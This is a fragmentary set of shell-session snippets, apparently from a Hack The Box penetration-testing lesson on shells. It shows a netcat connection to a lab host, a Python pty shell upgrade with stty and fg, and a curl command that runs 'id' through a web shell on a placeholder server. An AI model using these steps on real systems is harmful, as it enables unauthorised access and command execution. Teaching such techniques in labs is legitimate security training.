...
```shell-session
frodonomojo@htb[/htb]$ nc 10.10.10.1 1234
...
```shell-session
frodonomojo@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```
...
frodonomojo@htb[/htb]$ stty raw -echo
frodonomojo@htb[/htb]$ fg
...
```shell-session
frodonomojo@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
